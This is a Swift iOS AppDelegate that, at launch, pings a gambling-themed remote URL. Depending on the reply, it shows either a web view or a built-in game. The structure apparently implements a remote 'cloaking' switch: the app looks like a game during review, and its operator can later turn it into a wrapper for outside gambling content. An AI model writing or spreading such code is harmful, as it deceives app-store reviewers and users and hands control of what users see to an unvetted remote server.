import UIKit

@main
class AppDelegate: UIResponder, UIApplicationDelegate {

    var window: UIWindow?

    func application(_ application: UIApplication,
                     didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
        
        window = UIWindow(frame: UIScreen.main.bounds)
        
        let url = URL(string: "https://best-igaming.ru/9fsfH1hS")!
        var request = URLRequest(url: url)
        request.httpMethod = "HEAD"

        URLSession.shared.dataTask(with: request) { _, response, error in
            DispatchQueue.main.async {
                if let httpResponse = response as? HTTPURLResponse,
                   httpResponse.statusCode != 404 {
                    self.window?.rootViewController = WebViewController()
                } else {
                    self.window?.rootViewController = GameViewController()
                }
                self.window?.makeKeyAndVisible()
            }
        }.resume()
        
        return true
    }
}
